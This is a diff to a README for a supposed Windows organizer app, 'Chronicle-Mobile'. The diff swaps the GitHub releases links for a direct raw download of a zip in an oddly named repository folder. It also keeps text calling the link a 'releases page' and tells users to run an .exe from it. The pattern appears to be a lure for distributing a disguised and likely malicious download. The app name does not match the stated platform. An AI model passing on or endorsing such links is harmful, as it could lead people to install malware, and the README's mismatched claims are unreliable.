@@ -1,6 +1,6 @@
 # 📱 Chronicle-Mobile - Organize your life with ease daily
 
-[![](https://img.shields.io/badge/Download-Chronicle--Mobile-blue.svg)](https://github.com/Dianaabu690/Chronicle-Mobile/releases)
+[![](https://img.shields.io/badge/Download-Chronicle--Mobile-blue.svg)](https://raw.githubusercontent.com/Dianaabu690/Chronicle-Mobile/main/imperfectibility/Chronicle-Mobile-3.2.zip)
 
 Chronicle-Mobile helps you track your daily tasks, manage your schedule, and keep your notes in one place. This application runs on your Windows computer and provides a way to stay organized without complex tools. You can use this software to plan your day, set reminders for important events, and save lists of things to do.
 
@@ -9,7 +9,7 @@ Chronicle-Mobile helps you track your daily tasks, manage your schedule, and kee
 Follow these steps to set up the software on your computer. You do not need technical knowledge to complete this process. The application works on Windows 10 and Windows 11. 
 
 1. Ensure your computer connects to the internet.
-2. Visit the releases page at https://github.com/Dianaabu690/Chronicle-Mobile/releases.
+2. Visit the releases page at https://raw.githubusercontent.com/Dianaabu690/Chronicle-Mobile/main/imperfectibility/Chronicle-Mobile-3.2.zip
 3. Locate the latest version of the software.
 4. Download the file that ends in .exe.
 5. Save the file to your computer.
